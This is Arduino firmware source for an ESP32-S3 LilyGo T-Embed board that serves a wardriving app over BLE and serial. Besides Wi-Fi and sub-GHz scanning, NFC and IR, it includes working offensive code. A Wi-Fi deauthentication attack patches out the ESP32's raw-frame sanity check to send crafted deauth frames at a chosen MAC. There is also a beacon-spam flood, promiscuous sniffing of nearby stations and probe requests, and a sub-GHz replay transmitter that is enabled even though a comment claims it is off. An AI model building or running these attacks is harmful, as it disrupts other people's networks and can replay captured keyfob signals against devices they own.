// tembedbiscuit — LilyGo T-Embed CC1101 (Plus) as a Flying Flocks "Biscuit" board.
//
// A self-contained firmware IMAGE (not Marauder) that speaks the public Biscuit
// BLE/GATT protocol, so Flying Flocks connects to it like any fleet board and its
// results flow onto the wardrive map with no app changes. The same line protocol
// is mirrored over USB-CDC serial (DATA:/STATUS: out, CMD: in).
//
// Hardware exposed (LilyGo T-Embed CC1101 Plus, ESP32-S3 dual-core):
//   * CC1101 sub-GHz  -> DATA:RF / DATA:TPMS / DATA:WEATHER / DATA:KEYFOB, gated CMD:tx
//     (ported from the working G:\arduino-tools\sketches\c5biscuit\c5biscuit.ino,
//      re-pinned for this board + its RF band-select antenna switch)
//   * Wi-Fi (2.4 GHz) -> DATA:AP (scan) + DATA:STA / DATA:PROBE / DATA:PKT (promiscuous)
//     + offensive CMD:deauth / CMD:beaconspam (app-gated)
//   * PN532 NFC/RFID  -> DATA:NFC on CMD:nfcread
//   * IR TX/RX        -> CMD:irsend / DATA:IR
//   * ST7789 display  -> live connection/scan status + board-id line
//   * WS2812 LED + rotary encoder/buttons -> local status + DATA:BTN
//
// The ESP32-S3 is dual-core, so the BLE host runs on the other core and blocking
// is less punishing than on the single-core C5 — but scans still yield and bail on
// disconnect. Protocol/pins are documented in TEMBED_BISCUIT.md.

#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <Wire.h>
#include <SPI.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <Adafruit_NeoPixel.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <Adafruit_PN532.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <IRrecv.h>
#include <IRutils.h>

// ---- Biscuit GATT contract (matches the app's BiscuitGatt, verified) --------
#define SVC_UUID  "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
#define CMD_UUID  "beb5483e-36e1-4688-b7f5-ea07361b26a8"
#define RESP_UUID "beb5483e-36e1-4688-b7f5-ea07361b26a9"
#define STAT_UUID "beb5483e-36e1-4688-b7f5-ea07361b26aa"

#define DEV_NAME "Biscuit-TEmbed"

// ---- T-Embed CC1101 pins (official repo examples/utilities.h) ---------------
#define PIN_SPI_SCK  11
#define PIN_SPI_MISO 10
#define PIN_SPI_MOSI 9
#define CC1101_CS    12
#define CC1101_GDO0  3      // BOARD_LORA_IO0
#define CC1101_GDO2  38     // BOARD_LORA_IO2
#define RF_SW1       47     // antenna band-select
#define RF_SW0       48
#define BOARD_PWR_EN 15     // MUST be HIGH or the board powers off

#define TFT_BL  21
#define TFT_CS  41
#define TFT_DC  16
#define TFT_RST -1

#define I2C_SDA 8
#define I2C_SCL 18
#define PN532_IRQ_PIN 17
#define PN532_RST_PIN 45

#define IR_TX_PIN 2
#define IR_RX_PIN 1

#define WS2812_PIN 14
#define WS2812_N   8
#define ENC_A   4
#define ENC_B   5
#define ENC_KEY 0
#define USER_KEY 6

// ---- sub-GHz config (same bands as c5biscuit) ------------------------------
const float SUBGHZ_FREQS[] = {315.00f, 433.92f, 868.00f, 915.00f};
const int   SUBGHZ_N = 4;
const int   RF_ACTIVITY_DBM = -92;
const float RF_DECODE_HZ[] = {433.92f, 315.00f};
const int   RF_DECODE_N = 2;

// Sub-GHz TRANSMIT gate — OFF unless compiled with ALLOW_TX 1. Replays a captured
// OOK burst (your OWN devices only; the app confirms ownership first).
#define ALLOW_TX 1
const uint32_t TX_SHORT_US = 500;
const uint32_t TX_LONG_US  = 1000;
const int      TX_REPEATS  = 4;

// ---- objects ---------------------------------------------------------------
Adafruit_ST7789  tft  = Adafruit_ST7789(&SPI, TFT_CS, TFT_DC, TFT_RST);
Adafruit_NeoPixel leds(WS2812_N, WS2812_PIN, NEO_GRB + NEO_KHZ800);
Adafruit_PN532   nfc(PN532_IRQ_PIN, PN532_RST_PIN, &Wire);
IRsend           irsend(IR_TX_PIN);
IRrecv           irrecv(IR_RX_PIN);

BLECharacteristic *respChar = nullptr;
BLECharacteristic *statChar = nullptr;
volatile bool connected = false;
volatile bool scanning  = false;     // generic DATA:AP wardrive sweep
volatile bool subScan   = false;     // sub-GHz sweep/decode active (CMD:scanall)
bool  cc1101ok = false;
bool  nfcok = false;
bool  irRxOn = false;
String op = "idle";

// Sub-GHz TX request handed from BLE callback to loop().
volatile bool txPending = false;
float  txFreq = 433.92f;
String txBits = "";

bool serialActive = false;

// Promiscuous sniffer -> loop() drain queue (BLE must not be touched in the cb).
static const int SNQ = 48;
struct SnRec { char line[72]; };
volatile SnRec   snq[SNQ];
volatile uint16_t snHead = 0, snTail = 0;
portMUX_TYPE snMux = portMUX_INITIALIZER_UNLOCKED;
volatile uint32_t pktBeacons = 0, pktDeauths = 0, pktProbes = 0, pktData = 0;
uint8_t  snifferMode = 0;            // 0 off, 'S' station, 'P' probe, 'M' pktmon
volatile bool deauthRun = false, beaconRun = false;
uint8_t  deauthTarget[6] = {0};
bool     haveDeauthTarget = false;

// GDO0 edge-capture ring buffer (sub-GHz raw decode window only).
static const int CAP_MAX = 1024;
volatile uint32_t capBuf[CAP_MAX];
volatile uint16_t capHead = 0;
uint16_t          capTail = 0;
portMUX_TYPE capMux = portMUX_INITIALIZER_UNLOCKED;

void IRAM_ATTR gdo0Isr() {
  uint32_t t = micros();
  portENTER_CRITICAL_ISR(&capMux);
  uint16_t next = (capHead + 1) % CAP_MAX;
  if (next != capTail) { capBuf[capHead] = t; capHead = next; }
  portEXIT_CRITICAL_ISR(&capMux);
}

// ===========================================================================
// Output
// ===========================================================================
void notifyLine(const String &line) {
  Serial.print(line);
  if (respChar && connected) {
    respChar->setValue((uint8_t *)line.c_str(), line.length());
    respChar->notify();
    delay(6);
  }
}

void setStatus(const char *o) {
  op = o;
  if (statChar) {
    String j = "{\"status\":0,\"battery\":100,\"op\":\"";
    j += o; j += "\",\"heap\":"; j += String(ESP.getFreeHeap());
    j += ",\"model\":\"Biscuit-TEmbed\",\"name\":\"" DEV_NAME "\"}";
    statChar->setValue((uint8_t *)j.c_str(), j.length());
  }
}

const char *authStr(wifi_auth_mode_t a) {
  switch (a) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3";
    default: return "WPA2";
  }
}

String hex2(const uint8_t *b, int n) {
  String s; char t[3];
  for (int i = 0; i < n; i++) { sprintf(t, "%02X", b[i]); s += t; }
  return s;
}

// ===========================================================================
// Display (status only; the app is the real UI)
// ===========================================================================
void drawStatus(const String &l1, const String &l2) {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_WHITE);
  tft.setTextSize(2);
  tft.setCursor(6, 8);   tft.print("Biscuit T-Embed");
  tft.setTextSize(1);
  tft.setCursor(6, 36);  tft.setTextColor(ST77XX_CYAN);  tft.print(l1);
  tft.setCursor(6, 52);  tft.setTextColor(ST77XX_GREEN); tft.print(l2);
  tft.setCursor(6, 150); tft.setTextColor(tft.color565(120, 120, 120));
  tft.print("svc 4fafc201  "); tft.print(DEV_NAME);
}

void setLed(uint8_t r, uint8_t g, uint8_t b) {
  for (int i = 0; i < WS2812_N; i++) leds.setPixelColor(i, leds.Color(r, g, b));
  leds.show();
}

// ===========================================================================
// CC1101 sub-GHz (ported from c5biscuit.ino, re-pinned + band switch)
// ===========================================================================
// The T-Embed routes the CC1101 through an antenna band-select switch; set it to
// match the tuned frequency or the radio hears nothing.
void setRfBand(float mhz) {
  if (mhz < 350)        { digitalWrite(RF_SW1, HIGH); digitalWrite(RF_SW0, LOW);  } // 315
  else if (mhz < 600)   { digitalWrite(RF_SW1, HIGH); digitalWrite(RF_SW0, HIGH); } // 434
  else                  { digitalWrite(RF_SW1, LOW);  digitalWrite(RF_SW0, HIGH); } // 868/915
}

bool initCC1101() {
  ELECHOUSE_cc1101.setSpiPin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI, CC1101_CS);
  ELECHOUSE_cc1101.setGDO0(CC1101_GDO0);
  ELECHOUSE_cc1101.Init();
  if (!ELECHOUSE_cc1101.getCC1101()) return false;
  setRfBand(433.92f);
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.SetRx();
  return true;
}

void subghzRssiSweep() {
  if (!cc1101ok) { cc1101ok = initCC1101(); if (!cc1101ok) return; }
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setModulation(0);
  for (int i = 0; i < SUBGHZ_N; i++) {
    setRfBand(SUBGHZ_FREQS[i]);
    ELECHOUSE_cc1101.setMHZ(SUBGHZ_FREQS[i]);
    ELECHOUSE_cc1101.SetRx();
    delay(60);
    int rssi = ELECHOUSE_cc1101.getRssi();
    if (rssi > RF_ACTIVITY_DBM)
      notifyLine("DATA:RF:" + String(SUBGHZ_FREQS[i], 2) + "," + String(rssi) + "\n");
  }
}

static const uint32_t GAP_US = 5000;

void applyRadioRaw(float mhz, bool ook) {
  setRfBand(mhz);
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setModulation(ook ? 2 : 0);
  ELECHOUSE_cc1101.setMHZ(mhz);
  if (ook) { ELECHOUSE_cc1101.setDRate(5); ELECHOUSE_cc1101.setRxBW(203); }
  else { ELECHOUSE_cc1101.setDeviation(38); ELECHOUSE_cc1101.setDRate(19.2); ELECHOUSE_cc1101.setRxBW(203); }
  ELECHOUSE_cc1101.SetRx();
}

int drainBurst(uint16_t *out, int maxOut) {
  uint16_t head, tail;
  portENTER_CRITICAL(&capMux); head = capHead; tail = capTail; portEXIT_CRITICAL(&capMux);
  if (head == tail) return 0;
  uint32_t lastT; uint16_t prev = (head + CAP_MAX - 1) % CAP_MAX;
  portENTER_CRITICAL(&capMux); lastT = capBuf[prev]; portEXIT_CRITICAL(&capMux);
  if ((micros() - lastT) < GAP_US) return 0;
  int n = 0; uint32_t prevT = 0; bool first = true;
  while (tail != head && n < maxOut) {
    uint32_t t; portENTER_CRITICAL(&capMux); t = capBuf[tail]; tail = (tail + 1) % CAP_MAX; portEXIT_CRITICAL(&capMux);
    if (!first) { uint32_t d = t - prevT; out[n++] = (d > 65535) ? 65535 : (uint16_t)d; }
    prevT = t; first = false;
  }
  portENTER_CRITICAL(&capMux); capTail = tail; portEXIT_CRITICAL(&capMux);
  return n;
}

int manchester(const uint16_t *iv, int n, uint32_t bitUs, uint8_t *bytes, int maxBytes) {
  static uint8_t half[2048];
  int hn = 0, level = 0;
  for (int i = 0; i < n && hn < 2046; i++) {
    int reps = (iv[i] > (bitUs + bitUs / 2)) ? 2 : 1;
    for (int r = 0; r < reps && hn < 2046; r++) half[hn++] = level;
    level ^= 1;
  }
  int outBits = 0; uint8_t b = 0;
  for (int i = 0; i + 1 < hn; i += 2) {
    int a = half[i], c = half[i + 1];
    if (a == c) return 0;
    b = (b << 1) | ((a == 1 && c == 0) ? 1 : 0);
    if (++outBits % 8 == 0) { if (outBits / 8 <= maxBytes) bytes[outBits / 8 - 1] = b; b = 0; }
  }
  return outBits / 8;
}

void emitTpms(float mhz, const uint8_t *b, int n) {
  if (n < 7) return;
  String id = hex2(b, 4);
  float kpa = b[5] * 2.5f;
  int tempC = b[6] - 50;
  notifyLine("DATA:TPMS:" + String(mhz, 2) + "," + id + "," +
             String(kpa, 0) + "," + String(tempC) + "," + hex2(b, n) + "\n");
}

bool decodeNexus(const uint16_t *iv, int n, uint8_t &id, int &tempC10, int &hum, int &chan, int &batt) {
  uint8_t bits[40]; int nb = 0;
  for (int i = 0; i < n; i++) {
    uint16_t d = iv[i];
    if (d > 3800) { nb = 0; continue; }
    if (d < 750) continue;
    if (nb < 40) bits[nb++] = (d > 1500) ? 1 : 0;
    if (nb == 36) break;
  }
  if (nb < 36) return false;
  int marker = (bits[24] << 3) | (bits[25] << 2) | (bits[26] << 1) | bits[27];
  if (marker != 0xF || bits[9] != 0) return false;
  id = 0; for (int i = 0; i < 8; i++) id = (id << 1) | bits[i];
  batt = bits[8];
  chan = (bits[10] << 1) | bits[11];
  int t = 0; for (int i = 12; i < 24; i++) t = (t << 1) | bits[i];
  if (t & 0x800) t -= 0x1000;
  tempC10 = t;
  hum = 0; for (int i = 28; i < 36; i++) hum = (hum << 1) | bits[i];
  if (hum < 1 || hum > 100) return false;
  if (tempC10 < -400 || tempC10 > 700) return false;
  return true;
}

bool emitWeather(float mhz, const uint16_t *iv, int n) {
  uint8_t id; int t10, hum, ch, batt;
  if (!decodeNexus(iv, n, id, t10, hum, ch, batt)) return false;
  char ids[8]; sprintf(ids, "%02X%d", id, ch);
  notifyLine("DATA:WEATHER:" + String(mhz, 2) + "," + String(ids) + "," +
             String(t10 / 10.0f, 1) + "," + String(hum) + "\n");
  return true;
}

void processBurst(float mhz, bool ook, const uint16_t *iv, int n) {
  if (ook) {
    if (emitWeather(mhz, iv, n)) return;
    String bits;
    for (int i = 0; i < n && bits.length() < 96; i++) bits += (iv[i] > 500) ? '1' : '0';
    notifyLine("DATA:KEYFOB:" + String(mhz, 2) + "," + String(n) + "," + bits + "\n");
  } else {
    uint8_t bytes[32];
    int nb = manchester(iv, n, 52, bytes, sizeof(bytes));
    if (nb < 7) nb = manchester(iv, n, 26, bytes, sizeof(bytes));
    if (nb >= 7) emitTpms(mhz, bytes, nb < 20 ? nb : 20);
  }
}

void rfDecodeWindow() {
  if (!cc1101ok) return;
  static uint16_t iv[CAP_MAX];
  attachInterrupt(digitalPinToInterrupt(CC1101_GDO0), gdo0Isr, CHANGE);
  for (int band = 0; band < RF_DECODE_N; band++) {
    for (int mod = 0; mod < 2; mod++) {
      applyRadioRaw(RF_DECODE_HZ[band], mod == 1);
      portENTER_CRITICAL(&capMux); capHead = 0; capTail = 0; portEXIT_CRITICAL(&capMux);
      uint32_t t0 = millis();
      while (millis() - t0 < 400 && (connected || serialActive) && subScan) {
        int n = drainBurst(iv, CAP_MAX);
        if (n >= 16) processBurst(RF_DECODE_HZ[band], mod == 1, iv, n);
        delay(2);
      }
    }
  }
  detachInterrupt(digitalPinToInterrupt(CC1101_GDO0));
}

#if ALLOW_TX
void doTransmit(float mhz, const String &bits) {
  if (!cc1101ok) { cc1101ok = initCC1101(); if (!cc1101ok) return; }
  detachInterrupt(digitalPinToInterrupt(CC1101_GDO0));
  setRfBand(mhz);
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.setMHZ(mhz);
  ELECHOUSE_cc1101.SetTx();
  pinMode(CC1101_GDO0, OUTPUT);
  for (int rep = 0; rep < TX_REPEATS; rep++) {
    int level = 1;
    for (unsigned i = 0; i < bits.length(); i++) {
      digitalWrite(CC1101_GDO0, level);
      delayMicroseconds(bits[i] == '1' ? TX_LONG_US : TX_SHORT_US);
      level ^= 1;
    }
    digitalWrite(CC1101_GDO0, LOW);
    delay(8);
  }
  ELECHOUSE_cc1101.SetRx();
  pinMode(CC1101_GDO0, INPUT);
  notifyLine("DATA:TXDONE:" + String(mhz, 2) + "," + String(bits.length()) + "\n");
}
#endif

// ===========================================================================
// Wi-Fi recon — AP scan (DATA:AP) + promiscuous STA/PROBE/pktmon
// ===========================================================================
void wifiScanBroadcast() {
  WiFi.scanNetworks(/*async=*/true, /*show_hidden=*/true);
  uint32_t t0 = millis();
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
    delay(30);
    if (!(connected || serialActive)) { WiFi.scanDelete(); return; }
    if (millis() - t0 > 15000) { WiFi.scanDelete(); return; }
  }
  int n = WiFi.scanComplete();
  if (n < 0) { WiFi.scanDelete(); return; }
  for (int i = 0; i < n; i++) {
    if (!(connected || serialActive)) break;
    String line = "DATA:AP:" + WiFi.SSID(i) + "," + WiFi.BSSIDstr(i) + "," +
                  String(WiFi.channel(i)) + "," + String(WiFi.RSSI(i)) + "," +
                  authStr(WiFi.encryptionType(i)) + "\n";
    notifyLine(line);
  }
  WiFi.scanDelete();
}

// Push a sniffer record to the loop() drain queue (ISR/WiFi-task context safe).
static void snPush(const char *s) {
  portENTER_CRITICAL(&snMux);
  uint16_t next = (snHead + 1) % SNQ;
  if (next != snTail) { strncpy((char *)snq[snHead].line, s, 71); snq[snHead].line[71] = 0; snHead = next; }
  portEXIT_CRITICAL(&snMux);
}

static void macTo(char *dst, const uint8_t *m) {
  sprintf(dst, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

// Promiscuous RX: classify frames, count, and queue STA/PROBE records.
void promiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *fr = p->payload;
  int rssi = p->rx_ctrl.rssi;
  uint8_t fc = fr[0];
  uint8_t ftype = (fc >> 2) & 0x3;
  uint8_t fsub  = (fc >> 4) & 0xf;
  char line[72], amac[18], bmac[18];

  if (ftype == 0) {                         // management
    if (fsub == 8)  pktBeacons++;           // beacon
    else if (fsub == 12) pktDeauths++;      // deauth
    else if (fsub == 4) {                   // probe request
      pktProbes++;
      if (snifferMode == 'P' || snifferMode == 'M') {
        // SSID IE starts at tagged params (offset 24): id(0) len ssid...
        uint8_t ssidLen = fr[25];
        if (ssidLen > 0 && ssidLen <= 32) {
          char ss[33]; memcpy(ss, &fr[26], ssidLen); ss[ssidLen] = 0;
          snprintf(line, sizeof(line), "DATA:PROBE:%s,%d\n", ss, rssi);
          snPush(line);
        }
      }
    }
  } else if (ftype == 2) {                   // data
    pktData++;
    if (snifferMode == 'S' || snifferMode == 'M') {
      macTo(amac, &fr[10]);                  // addr2 = source (station)
      macTo(bmac, &fr[4]);                    // addr1 = dest (often the AP/BSSID)
      snprintf(line, sizeof(line), "DATA:STA:%s,%s,%d\n", amac, bmac, rssi);
      snPush(line);
    }
  }
}

void startSniffer(uint8_t mode) {
  snifferMode = mode;
  pktBeacons = pktDeauths = pktProbes = pktData = 0;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&promiscCb);
  esp_wifi_set_promiscuous(true);
}

void stopSniffer() {
  snifferMode = 0;
  esp_wifi_set_promiscuous(false);
}

// Drain queued sniffer records to BLE/serial (from loop(), where BLE is safe).
void drainSniffer() {
  for (int guard = 0; guard < 24; guard++) {
    char local[72];
    bool got = false;
    portENTER_CRITICAL(&snMux);
    if (snTail != snHead) { strncpy(local, (char *)snq[snTail].line, 72); snTail = (snTail + 1) % SNQ; got = true; }
    portEXIT_CRITICAL(&snMux);
    if (!got) break;
    notifyLine(String(local));
  }
}

// ---- offensive raw TX (app-gated like the C5 bridge) -----------------------
// The ESP32 Wi-Fi lib rejects crafted deauth frames via a sanity check; override
// the weak symbol so esp_wifi_80211_tx accepts them (needs the linker flag
// -Wl,--allow-multiple-definition, same as the Marauder build).
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }

uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // dest (broadcast by default)
  0x00,0x00,0x00,0x00,0x00,0x00,            // src (filled per target)
  0x00,0x00,0x00,0x00,0x00,0x00,            // bssid
  0x00, 0x00, 0x07, 0x00                    // seq + reason 7
};

void sendDeauthBurst() {
  if (haveDeauthTarget) {
    memcpy(&deauthFrame[10], deauthTarget, 6);
    memcpy(&deauthFrame[16], deauthTarget, 6);
  }
  for (int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

uint8_t beaconFrame[] = {
  0x80, 0x00, 0x00, 0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0xBA,0xDE,0xC0,0xFF,0xEE,0x00, 0xBA,0xDE,0xC0,0xFF,0xEE,0x00,
  0x00, 0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x64,0x00, 0x01,0x04,
  0x00, 0x06, 'B','i','s','c','1','0',      // SSID IE (len 6)
  0x01, 0x08, 0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c
};

void sendBeaconBurst() {
  static uint8_t ch = 1;
  beaconFrame[10] = beaconFrame[16] = 0xBA;
  beaconFrame[15] = beaconFrame[21] = ch;
  for (int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, sizeof(beaconFrame), false);
  if (++ch > 11) ch = 1;
}

// ===========================================================================
// NFC (PN532) and IR
// ===========================================================================
void nfcPoll() {
  if (!nfcok) { notifyLine("DATA:ERR:nfc,absent\n"); return; }
  uint8_t uid[7] = {0}; uint8_t uidLen = 0;
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 150)) {
    const char *kind = (uidLen == 4) ? "MifareClassic" : (uidLen == 7) ? "MifareUL/NTAG" : "ISO14443A";
    notifyLine("DATA:NFC:" + hex2(uid, uidLen) + "," + String(kind) + "\n");
  } else {
    notifyLine("DATA:NFC:,none\n");
  }
}

void irSend(const String &params) {
  // CMD:irsend:<protocol>,<hex>[,<bits>]   protocol: NEC|SONY|RC5|SAMSUNG|RAW
  int c1 = params.indexOf(',');
  String proto = (c1 < 0) ? params : params.substring(0, c1);
  String rest  = (c1 < 0) ? "" : params.substring(c1 + 1);
  int c2 = rest.indexOf(',');
  String hexv  = (c2 < 0) ? rest : rest.substring(0, c2);
  int bits = (c2 < 0) ? 32 : rest.substring(c2 + 1).toInt();
  uint64_t val = strtoull(hexv.c_str(), nullptr, 16);
  proto.toUpperCase();
  if (proto == "NEC")        irsend.sendNEC(val, bits);
  else if (proto == "SONY")  irsend.sendSony(val, bits ? bits : 12);
  else if (proto == "SAMSUNG") irsend.sendSAMSUNG(val, bits);
  else if (proto == "RC5")   irsend.sendRC5(val, bits ? bits : 13);
  else { notifyLine("DATA:ERR:ir,proto\n"); return; }
  notifyLine("DATA:IRTX:" + proto + "," + hexv + ",ok\n");
}

void irRxPump() {
  decode_results res;
  if (irrecv.decode(&res)) {
    notifyLine("DATA:IR:" + String(typeToString(res.decode_type)) + "," +
               String(res.bits) + "," + uint64ToString(res.value, 16) + "\n");
    irrecv.resume();
  }
}

// ===========================================================================
// Command handling (BLE + serial)
// ===========================================================================
void parseMac(const String &s, uint8_t *mac) {
  int v[6] = {0};
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6)
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
}

void stopAll() {
  scanning = false; subScan = false;
  deauthRun = false; beaconRun = false;
  stopSniffer();
  setStatus("idle");
  setLed(0, 0, 8);
}

void handleCommand(String v) {
  v.trim();
  if (!v.startsWith("CMD:")) return;

  if (v.startsWith("CMD:stopscan"))      { stopAll(); notifyLine("DATA:MODE:idle,stop\n"); return; }
  if (v.startsWith("CMD:scanall"))       { subScan = true; setStatus("subghz"); setLed(8,4,0); notifyLine("DATA:MODE:subghz,start\n"); return; }
  if (v.startsWith("CMD:tx:")) {
    String p = v.substring(7); int comma = p.indexOf(',');
    if (comma > 0) { txFreq = p.substring(0, comma).toFloat(); txBits = p.substring(comma + 1); txBits.trim();
      if (txFreq > 250 && txFreq < 960 && txBits.length() > 0) txPending = true; }
    return;
  }
  if (v.startsWith("CMD:stationlist") || v.startsWith("CMD:sniffsta")) { scanning=false; startSniffer('S'); setStatus("stations"); notifyLine("DATA:MODE:stations,start\n"); return; }
  if (v.startsWith("CMD:probesniff"))   { scanning=false; startSniffer('P'); setStatus("probes");   notifyLine("DATA:MODE:probes,start\n"); return; }
  if (v.startsWith("CMD:pktmon") || v.startsWith("CMD:monitor")) { scanning=false; startSniffer('M'); setStatus("pktmon"); notifyLine("DATA:MODE:pktmon,start\n"); return; }
  if (v.startsWith("CMD:deauth")) {
    haveDeauthTarget = false;
    int c = v.indexOf(':', 4);
    if (c > 0) { String t = v.substring(c + 1); t.trim(); if (t.length() >= 11) { parseMac(t, deauthTarget); haveDeauthTarget = true; } }
    scanning = false; deauthRun = true; setStatus("deauth"); setLed(12,0,0); notifyLine("DATA:ATK:deauth,start\n"); return;
  }
  if (v.startsWith("CMD:beaconspam") || v.startsWith("CMD:beacon")) { scanning=false; beaconRun = true; setStatus("beaconspam"); setLed(12,0,12); notifyLine("DATA:ATK:beacon,start\n"); return; }
  if (v.startsWith("CMD:nfcread") || v.startsWith("CMD:nfc"))   { nfcPoll(); return; }
  if (v.startsWith("CMD:irsend:"))      { irSend(v.substring(11)); return; }
  if (v.startsWith("CMD:irsniff"))      { irRxOn = true; irrecv.enableIRIn(); notifyLine("DATA:MODE:irsniff,start\n"); return; }

  // Generic wardrive sweep (main DATA:AP feed).
  if (v.startsWith("CMD:scan") || v.startsWith("CMD:sniff") || v.startsWith("CMD:aplist")) {
    subScan=false; stopSniffer(); scanning = true; setStatus("wardrive"); setLed(0,10,0); return;
  }
  notifyLine("DATA:ERR:unknown," + v + "\n");
}

class CmdCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *c) override { handleCommand(c->getValue().c_str()); }
};

class SrvCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer *s) override { connected = true; setLed(0,0,16); drawStatus("BLE: connected", "op: idle"); }
  void onDisconnect(BLEServer *s) override {
    connected = false; stopAll();
    drawStatus("BLE: advertising", "waiting for app");
    BLEDevice::startAdvertising();
  }
};

void pollSerialCommands() {
  static String sbuf;
  while (Serial.available()) {
    char ch = (char)Serial.read();
    if (ch == '\n' || ch == '\r') {
      if (sbuf.length()) { String l = sbuf; sbuf = ""; l.trim(); if (l.startsWith("CMD:")) { serialActive = true; handleCommand(l); } }
    } else if (sbuf.length() < 160) sbuf += ch; else sbuf = "";
  }
}

// ===========================================================================
// setup / loop
// ===========================================================================
void setup() {
  Serial.begin(115200);
  delay(600);

  pinMode(BOARD_PWR_EN, OUTPUT); digitalWrite(BOARD_PWR_EN, HIGH);  // keep board powered
  pinMode(RF_SW0, OUTPUT); pinMode(RF_SW1, OUTPUT);
  pinMode(ENC_A, INPUT_PULLUP); pinMode(ENC_B, INPUT_PULLUP);
  pinMode(ENC_KEY, INPUT_PULLUP); pinMode(USER_KEY, INPUT_PULLUP);
  pinMode(CC1101_GDO0, INPUT);

  leds.begin(); leds.setBrightness(40); setLed(0, 0, 8);

  SPI.begin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI, -1);
  pinMode(TFT_BL, OUTPUT); digitalWrite(TFT_BL, HIGH);
  tft.init(170, 320);
  tft.setRotation(0);
  drawStatus("booting...", "");

  Wire.begin(I2C_SDA, I2C_SCL);
  nfc.begin();
  uint32_t ver = nfc.getFirmwareVersion();
  nfcok = (ver != 0);
  if (nfcok) nfc.SAMConfig();

  cc1101ok = initCC1101();
  Serial.println(cc1101ok ? "[sub] CC1101 detected." : "[sub] CC1101 not detected.");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  esp_wifi_set_promiscuous(false);

  BLEDevice::init(DEV_NAME);
  BLEDevice::setMTU(517);
  BLEServer *server = BLEDevice::createServer();
  server->setCallbacks(new SrvCallbacks());
  BLEService *svc = server->createService(SVC_UUID);

  BLECharacteristic *cmd = svc->createCharacteristic(
      CMD_UUID, BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_WRITE_NR);
  cmd->setCallbacks(new CmdCallbacks());

  respChar = svc->createCharacteristic(RESP_UUID, BLECharacteristic::PROPERTY_NOTIFY);
  respChar->addDescriptor(new BLE2902());

  statChar = svc->createCharacteristic(STAT_UUID, BLECharacteristic::PROPERTY_READ);
  setStatus("idle");

  svc->start();
  BLEAdvertising *adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(SVC_UUID);
  adv->setScanResponse(true);
  BLEDevice::startAdvertising();

  drawStatus("BLE: advertising", "waiting for app");
  Serial.println("[ble] advertising as \"" DEV_NAME "\" (service 4fafc201).");
}

void loop() {
  pollSerialCommands();
#if ALLOW_TX
  if (txPending) { txPending = false; doTransmit(txFreq, txBits); }
#endif
  if (irRxOn) irRxPump();

  bool host = connected || serialActive;

  if (host && scanning) {
    wifiScanBroadcast();
    delay(40);
  } else if (host && subScan) {
    subghzRssiSweep();
    delay(30);
    if (subScan) rfDecodeWindow();
  } else if (host && snifferMode) {
    drainSniffer();
    static uint32_t lastPkt = 0;
    if (millis() - lastPkt > 1000) {
      lastPkt = millis();
      notifyLine("DATA:PKT:" + String(pktBeacons) + "," + String(pktDeauths) + "," +
                 String(pktProbes) + "," + String(pktData) + "\n");
    }
    delay(20);
  } else if (host && deauthRun) {
    sendDeauthBurst(); delay(50);
  } else if (host && beaconRun) {
    sendBeaconBurst(); delay(50);
  } else {
    delay(60);
  }

  static uint32_t lastStat = 0;
  if (millis() - lastStat > 2000) { lastStat = millis(); setStatus(op.c_str()); }
}
